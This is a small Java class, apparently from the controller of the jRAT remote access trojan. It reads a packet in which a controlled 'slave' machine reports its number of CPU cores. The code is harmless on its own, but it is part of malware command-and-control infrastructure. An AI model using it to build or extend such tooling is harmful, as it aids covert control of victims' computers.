package jrat.controller.packets.incoming;

import jrat.controller.Slave;

import java.io.DataInputStream;


public class Packet14InitAvailableCores extends AbstractIncomingPacket {

	@Override
	public void read(Slave slave, DataInputStream dis) throws Exception {
		short cores = slave.readShort();
		slave.setCores(cores);
	}

}
